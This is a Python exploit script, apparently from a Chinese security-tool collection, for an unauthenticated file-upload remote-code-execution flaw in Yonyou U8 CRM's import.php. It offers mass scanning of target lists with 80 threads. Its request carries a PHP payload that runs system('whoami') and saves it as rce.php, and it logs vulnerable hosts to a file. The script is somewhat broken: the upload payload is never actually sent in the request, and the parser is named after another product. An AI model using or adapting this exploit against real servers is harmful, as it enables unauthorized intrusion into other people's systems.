# 用友U8 CRM import.php 文件上传致RCE漏洞
# title="用友U8CRM"
# 产品简介:用友U8 CRM客户关系管理系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。
# 漏洞概述:用友 U8 CRM客户关系管理系统 import.php 文件存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
# 利用/tmpfile/xxx.php

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
\x1b[38m██╗   ██╗ █████╗          ██████╗██████╗ ███╗   ███╗
\x1b[36m██║   ██║██╔══██╗        ██╔════╝██╔══██╗████╗ ████║
\x1b[34m██║   ██║╚█████╔╝        ██║     ██████╔╝██╔████╔██║
\x1b[35m██║   ██║██╔══██╗        ██║     ██╔══██╗██║╚██╔╝██║
\x1b[31m╚██████╔╝╚█████╔╝███████╗╚██████╗██║  ██║██║ ╚═╝ ██║
\x1b[33m ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝                                                   
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                       
--author:Kucei  --Vession:用友U8 CRM import.php 文件上传致RCE漏洞                                                                                                             
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("AnalyticsCloud_分析云-FileReading")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5',
    }
    data='------WebKitFormBoundarye0z8QbHs79gL8vW5\r\nContent-Disposition: form-data; name="xfile"; filename="1.xls"\r\n\r<?php system("whoami");unlink(__FILE__);?>\r\n------WebKitFormBoundarye0z8QbHs79gL8vW5\r\nContent-Disposition: form-data; name="combo"\r\n\rrce.php\r\n------WebKitFormBoundarye0z8QbHs79gL8vW5--\r\n'
    try :
        response = requests.post(url=target+url_payload,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and 'success' in response.text:
            print( f"[+] {target} 存在漏洞")
            with open('用友U8_CRM_import_upfile-RCE.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")

if __name__ == '__main__':
    main()